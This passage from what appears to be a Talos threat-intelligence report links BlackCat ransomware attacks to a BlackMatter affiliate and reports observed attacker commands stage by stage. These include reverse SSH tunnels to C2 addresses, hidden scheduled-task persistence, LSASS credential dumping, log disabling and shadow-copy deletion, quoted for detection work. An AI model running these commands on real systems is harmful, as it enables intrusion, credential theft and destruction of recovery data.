According](https://www.google.com/url?q=https://www.bloomberg.com/news/articles/2021-06-04/hackers-breached-colonial-pipeline-using-compromised-password&sa=D&source=editors&ust=1647513308802538&usg=AOvVaw37uzheC5fS_U15ft9Jm5i_)\nto a BlackCat representative, BlackCat is not a rebranding of BlackMatter, but its team\nis made from affiliates of other RaaS groups (including BlackMatter).\nTalos has observed at least one attacker that used BlackMatter was likely one of the\nearly adopters of BlackCat. In this post, we'll describe these attacks and the\nrelationship between them.\nUnderstanding the techniques and tools used by RaaS affiliates helps organizations\ndetect and prevent attacks before the ransomware itself is executed, at which point,\nevery second means lost data.\n\n\n-----\n\nBlackCat ransomware, also known as ALPHV, has quickly gained notoriety for being used\nin double ransom (encrypted files and stolen file disclosure) attacks against companies. It\nfirst appeared in November 2021 and, since then, several companies have been hit across\nthe globe. However, more than 30 percent of the compromises happened to U.S.-based\ncompanies.\n\nSeveral security companies have noticed a connection between the BlackCat, BlackMatter\n[and DarkSide ransomware groups. Recently, in a Recorded Future interview with a BlackCat](https://www.google.com/url?q=https://therecord.media/an-alphv-blackcat-representative-discusses-the-groups-plans-for-a-ransomware-meta-universe/&sa=D&source=editors&ust=1647513308803579&usg=AOvVaw17UXCOc6CZ5rfH1eO_m-4p)\nrepresentative, the representative confirmed that there was a connection, but no rebranding\nor other direct relationship.\n\nThe BlackCat representative explained that the operators are instead affiliates of other RaaS\noperations and the actors built upon a foundation of their previous knowledge gained as part\nof other groups. Affiliates in this context are the groups that compromise companies'\nnetworks and deploy the ransomware provided by the RaaS operators.\n\nIf this is true, BlackCat seems to be a case of vertical business expansion. In essence, it's a\nway to control the upstream supply chain by making a service that is key to their business\n(the RaaS operator) better suited for their needs and adding another source of revenue.\n\n\n-----\n\nVertical expansion is also a common business strategy when there is a lack of trust in the\nsupply chain. There are several cases of vulnerabilities in ransomware encryption, and even\nof backdoors that can explain a lack of trust in RaaS. One particular case mentioned by the\n[BlackCat representative, was a flaw in DarkSide/BlackMatter ransomware allowing victims to](https://www.google.com/url?q=https://blog.emsisoft.com/en/39181/on-the-matter-of-blackmatter/&sa=D&source=editors&ust=1647513308804241&usg=AOvVaw2IJqvHbl9Y8cpPY6Q1oe73)\ndecrypt their files without paying the ransom. Victims used this vulnerability for several\nmonths, resulting in big losses for affiliates.\n\n## BlackCat/BlackMatter connection\n\nWhile researching a BlackCat ransomware attack from December 2021, we observed a\ndomain (and respective IP addresses) used to maintain persistent access to the network.\nThis domain had also been used in a BlackMatter attack in September 2021. Further\nanalysis revealed more commonalities, such as tools, file names and techniques that were\ncommon to both ransomware variants.\n\nAffiliates are responsible for compromising systems and deploying ransomware, so it is likely\nthat attacks carried out by the same ransomware family may differ in techniques and\nprocedures. On the other hand, RaaS operators are known to make training materials and\ngeneral techniques and tools available to their affiliates, like the leaked Conti ransomware\n[playbook covered by Talos in a previous blog. This may suggest there are some similarities](https://www.google.com/url?q=https://blog.talosintelligence.com/2021/09/Conti-leak-translation.html&sa=D&source=editors&ust=1647513308804967&usg=AOvVaw3iM1-jpjE9a4dD7sQ6MKPh)\nacross affiliates.\n\nOne difference we would expect to see across RaaS affiliates is the command and control\n(C2) infrastructure used for certain attacks. However, the overlapping C2 address found used\nin the BlackMatter and BlackCat attacks lead us to assess with moderate confidence that the\nsame affiliate was responsible for both attacks.\n\nThis connection suggests that a BlackMatter affiliate was likely an early adopter — possibly\nin the first month of operation — of BlackCat. This is further evidence to support the rumors\nthat there are strong ties between BlackMatter and BlackCat.\n\n## Attack details\n\nWe analyzed the actions taken by what we believe to be the same affiliate/attackers in the\nDecember BlackCat attack and a September BlackMatter attack. In terms of attack flow, the\nattacks were similar to other human-operated ransomware attacks: initial compromise,\nfollowed by an exploration and data exfiltration phase, then attack preparation and finally, the\n\n\n-----\n\nattack execution.\n\nThe following table summarizes the commonalities and differences in the MITRE ATT&CK®\nframework between both attacks:\n\n### Initial access\n\nWe could not identify the initial compromise vector for the BlackCat attack. It is likely that the\nattack happened on a system not monitored by Cisco Talos telemetry or that a previously\n\n\n-----\n\ncompromised account was used to log into an exposed system.\n\nThere was evidence in the BlackMatter attack that the actor established initial access via the\npossible exploitation of Microsoft Exchange vulnerabilities. However, we could not directly tie\nattempts of exploiting vulnerabilities in Microsoft Exchange to the attack and, for this reason,\nwe assess with low confidence that the attack may have started with the exploitation of a\nvulnerability in Exchange.\n\n### Persistence\n\nBeyond the access provided by the first exploitation vector, the attackers made sure they had\nadditional remote access to several internal systems.\n\n[During the BlackCat attack, the actors used a tool called reverse-ssh, compiled with the C2](https://www.google.com/url?q=https://github.com/Fahrj/reverse-ssh&sa=D&source=editors&ust=1647513308806628&usg=AOvVaw3dMZRdlDPOdzpw7mx5obbm)\nserver address embedded, to set up reverse SSH tunnels and provide reverse shells to the\nattacker. Reverse-ssh was deployed to C:\\ directory and named: system, Windows or cache\ntask.\n\nIt was also observed hidden by writing to an alternate data stream (ADS) of the C:\\ directory\nusing the following command:\n\n**c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -command & {(get-**\n**content c:\\system -raw | set-content c:\\ -stream 'cachetask')}**\n**c:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn**\n**microsoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f**\n**c:\\windows\\system32\\schtasks.exe /run /tn microsoft\\windows\\wininet\\cachetask**\n\nThe “image file execution option” debugger registry key was another way to ensure the\nmalicious file would be persistently executed on the system:\n\nc:\\windows\\system32\\reg.exe add hklm\\software\\microsoft\\windows nt\\currentversion\\image\nfile execution options\\taskmgr.exe /v debugger /t reg_sz /d c:\\system\n\nDuring the BlackMatter attack, the group used a similar technique but with a different tool:\n[GO Simple Tunnel (GOST). GOST is a Go-based tunneling tool that was used to establish a](https://www.google.com/url?q=https://v2.gost.run/&sa=D&source=editors&ust=1647513308807736&usg=AOvVaw1OcMAq9JQfEju3U0DWuNuw)\nreverse SSH tunnel to an attacker-controlled C2 server. This C2 server is the same that was\nused in the BlackCat attack. The name used for the deployed Gost file was \"system.exe\",\nsimilar to the file name used in the BlackCat attack for reverse-ssh.\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr\nc:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks\n/create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l\nrtcp://0 0 0 0:1116/127 0 0 1:3388 -f mwss://52[ ]149[ ]228[ ]45:443 /st 12:00 /f cmd exe /q /c\n\n\n-----\n\nschtasks /create /ru system /sc hourly /tn windows wsus update /tr\nc:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks\n/create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l\nrtcp://0.0.0.0:1117/127.0.0.1:3388 -f mwss://20[.]46[.]245[.]56:443 /st 12:00 /f\n\nThe same C2 domain was used in both attacks:\n\n### Defense evasion\n\nDuring the BlackCat attack, logs were disabled on several systems to avoid detection. For\nexample, before setting up the reverse-ssh scheduled task tool attackers disabled logs for\nthe task scheduler (a full list of disabled logs is provided in the IOC section below).\n\nc:\\windows\\system32\\wevtutil.exe set-log microsoft-windows-taskscheduler/operational\n/enabled:false\n\nThe anti-rootkit tool [Gmer was loaded into a small number of key systems. We believe the](https://www.google.com/url?q=http://www.gmer.net/?m%3D0&sa=D&source=editors&ust=1647513308809386&usg=AOvVaw3rvdJ3sbN00fi9FE7ZBArk)\nattackers used this to disable endpoint protection.\n\nc:\\users\\<username>\\downloads\\gmer\\gmer.exe\n\n### Credential access\n\nLocal and domain user credentials were collected, on a few key systems, by dumping the\n[LSASS process memory and extracting credentials with Microsoft Sysinternals Procdump](https://www.google.com/url?q=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&sa=D&source=editors&ust=1647513308809942&usg=AOvVaw1b2f46JCmTJ3V0tL1J9XC4)\n[and Dumpert:](https://www.google.com/url?q=https://github.com/outflanknl/Dumpert&sa=D&source=editors&ust=1647513308810101&usg=AOvVaw2pqhgpoaC7FNpU0g2m8rmI)\nc:\\windows\\system\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n\n-----\n\nc:\\windows\\system\\dumpert.exe lsass.exe\n\nDuring the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS\nmemory:\n\n**powershell rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump (get-process**\n**lsass).id c:\\temp\\lsass.dmp full**\n\nBeyond the Windows login credentials, during the BlackCat attack, the attackers used a tool\nnamed \"steal.exe\" to harvest additional data. We could not obtain the binary, but based on\nthe creation of a results folder with an \"archive.zip\" file inside it, we believe the tool may be\n[HackBrowserData, or a version of it.](https://www.google.com/url?q=https://github.com/moonD4rk/HackBrowserData&sa=D&source=editors&ust=1647513308811062&usg=AOvVaw0NnwQ5SUx6ZclAIabgKA3E)\n\nThe following commands were used on a few systems:\n\n**cmd.exe /q /c steal.exe 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c cd**\n**results 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c dir 1>**\n**\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c del archive.zip 1>**\n**\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c del c:\\steal.exe 1>**\n**\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1**\n\n### Discovery\n\nDuring the BlackCat attack, we observed network scanning and reconnaissance using\n[softperfect network scanner. This tool has many features beyond simple network scanning](https://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&sa=D&source=editors&ust=1647513308812407&usg=AOvVaw1E7ojK7_bE5XWmXquUqS7v)\nand was probably a valuable tool in understanding systems roles and network infrastructure\nand possible lateral movement. The following commands show this tool in use. Notice that\nthe name of the executable has been changed to make it blend into the system's regular\nprocesses.\n\n### cmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 cmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255\n\n\n-----\n\nADRecon was also used to collect information from Active Directory and its key servers.\n\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\adrecon.ps1\n\nDuring the BlackMatter attack, the attackers also searched for additional ways to maintain\naccess. For example, the following command shows the attackers exploring an existing\nTeamViewer installation:\n\n**cmd.exe /q /c teamviewer.exe --getid cmd.exe /q /c dir c:\"program files cmd.exe /q /c**\n**dir c:\"program files (x86) 1 cmd.exe /q /c dir c:\"program files (x86)\\teamviewer\\**\n**cmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe --getid**\n\n**cmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe -info**\n\nThe following commands show the attackers exploring the keepass password manager\nconfig:\n\n**cmd.exe /q /c dir c:\"program files (x86)\\**\n\n**cmd.exe /q /c dir c:\"program files (x86)\"keepass password safe 2\\**\n\n**cmd.exe /q /c type c:\"program files (x86)\"keepass password safe**\n**2\\keepass.exe.config**\n\n### Lateral movement\n\n[We observed lateral movement using three main tools and techniques, including Impacket's](https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1647513308815173&usg=AOvVaw0J5ExBm0XnrymkRAcHUPad)\nwmiexec, PowerShell using WinRM service and Microsoft Remote Desktop.\n\n[Impacket's WMIExec provides a shell on remote systems that have the WMI service](https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1647513308815448&usg=AOvVaw0UneQwYYA1gijAOtqPy1yQ)\nexposed. We observed its use in both the BlackCat and BlackMatter attacks. This tool's\nactivity can be detected by detecting processes created by wmipsrv.exe that terminate with\nthe following string:\n\n**1> \\\\127.0.0.1\\admin$\\__<timestamp>.<6 digits> 2>&1**\n\nThis tool was often used to issue a command to allow WinRM service network connections\n\n\n-----\n\nthrough the firewall, possibly for the convenience of using some prepared scripts:\n\n**cmd.exe /q /c netsh advfirewall firewall add rule name=service dir=in protocol=tcp**\n**localport=5985 action=permit 1> \\\\127.0.0.1\\c$\\windows\\temp\\qaiumg 2>&1**\n\nWinRM allows attackers to use PowerShell to execute commands on remote machines. This\ntool can be detected by searching for processes started by \"wsmprovhost.exe\". Below,\nthere's a few examples of WinRM being used for lateral movement, in this case, to disable\nlogging of many Windows services:\n\nc:\\windows\\system32\\wevtutil.exe set-log active directory web services /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log application /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log hardwareevents /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log internet explorer /enabled:false\n\nMicrosoft Remote Desktop was also used by the attackers to obtain GUI access to systems.\nThe following impacket command was issued before the adversary could gain remote admin\naccess.\n\n**cmd.exe /q /c reg add hkey_local_machine\\system\\currentcontrolset\\control\\lsa /v**\n**disablerestrictedadmin /t reg_dword /d 0 1> \\\\127.0.0.1\\admin\\$\\__<timestamp>\\.<num>**\n**2>&1**\n\nOther lateral movement techniques observed include PsEexec on both attacks and RemCom\n— an open-source version of psexec — during the BlackMatter attack.\n\n### Command and control\n\nInterestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload\nand download command, they revealed the use of Kali Linux to execute remote commands.\n\n**cmd.exe /q /c #upload c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1>**\n**\\\\127.0.0.1\\admin$\\<num>.<num> 2>&1**\n\n**cmd.exe /q /c #download c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc>**\n**1> \\\\127.0.0.1\\admin$\\<num>.<num> 2>&1**\n\nIt is unlikely that the attackers had a Kali Linux installation inside the victim's network, so\nremote control of the systems was likely achieved through the SSH tunnels described earlier.\n\n\n-----\n\n### Exfiltration\n\nAlthough we observed a suspiciously large number of documents opened and screenshots\ntaken from one of the compromised systems, we did not identify techniques used to exfiltrate\ndata from the network. It is possible that document exfiltration is carried out by the execution\nof upload/download commands similar to the ones listed above.\n\n### Impact\n\nIn both attacks, before the actual execution of the ransomware, the attackers performed\nseveral actions preparing systems to make the execution as successful as possible. On the\nday of the attack, the attacker logged in to the domain controller and opened the group policy\nmanagement interface. The attackers then dropped and executed a file named \"apply.ps1.\"\nWe believe this script created and prepared the group policy to cause the execution of the\nransomware throughout the domain.\n\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\apply.ps1\n\nThis execution results in the immediate writing of group policy files to disk and is followed by\nthe execution of the following command to force the deployment of the group policy:\n\n**cmd.exe /q /c gpupdate /force**\n\nA few minutes before BlackCat ransomware started encrypting files, the attackers executed\na script called \"defender.vbs\":\n\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\defender.vbs\n\nIn the BlackMatter attack, the exact same file was named \"def.vbs\" and executed minutes\nbefore the encryption began:\n\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\def.vbs\n\nWe believe this is part of the attack, but at this time do not know the exact role of this script.\n\nWhen encryption begins, the ransomware file named <num>.exe in the BlackCat attack and,\nsimilarly, <num>.exe in the BlackMatter attack, was dropped on the domain servers inside\nthe SYSVOL folder, making it accessible on the NETLOGON network share, accessible by\nall users in the domain. File encryption makes all systems execute these files from the\nremote share.\n\nBlackCat attack:\n\n\n-----\n\ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe --access-token <token>\n\nBlackMatter attack:\n\ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe\n\nThe following variations of the BlackCat command were observed:\n\n<num>.exe --access-token <token> /f\n\n<num>.exe --access-token <token> --no-prop-servers \\\\<hostname> --propagated\n\n<num>.exe -access-token <token> -v -p \\\\<hostname>\\scans\n\n<num>.exe --access-token <token>\n\n<num>.exe --child --access-token <token>\n\n<num>.exe -access-token <token> -v -p .\n\nThe BlackCat executable deployed other commands to make its execution more effective:\n\n**c:\\windows\\system32\\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1**\n\n**c:\\windows\\system32\\cmd.exe /c reg add**\n**hkey_local_machine\\system\\currentcontrolset\\services\\lanmanserver\\parameters /v**\n**maxmpxct /d 65535 /t reg_dword /f c:\\windows\\system32\\cmd.exe /c fsutil behavior set**\n**symlinkevaluation r2r:1 c:\\windows\\system32\\cmd.exe /c vssadmin.exe delete**\n**shadows /all /quiet c:\\windows\\system32\\cmd.exe /c wmic.exe shadowcopy delete**\n**c:\\windows\\system32\\cmd.exe /c arp -a c:\\windows\\system32\\cmd.exe /c bcdedit /set**\n**{default} c:\\windows\\system32\\cmd.exe /c cmd.exe /c for /f \"tokens=*\" %1 in**\n**('wevtutil.exe el') do wevtutil.exe cl \"%1\" c:\\windows\\system32\\cmd.exe /c bcdedit /set**\n**{default} recoveryenabled no**\n\n## Conclusion\n\n\n-----\n\nBlackCat first surfaced in November 2021, with the attack we described here taking place in\nDecember 2021. While we don't know how related BlackCat is to BlackMatter, we assess\nwith moderate confidence that based on the tools and techniques of these attacks and\noverlapping infrastructure, BlackMatter affiliates were likely among the early adopters of\nBlackCat.\n\nAs we have seen several times before, RaaS services come and go. Their affiliates,\nhowever, are likely to simply move on to a new service. And with them, many of the TTPs are\nlikely to persist.\n\nOne key aspect of these attacks is that adversaries take time exploring the environment and\npreparing it for a successful and broad attack before launching the ransomware, at which\npoint every second means lost data.
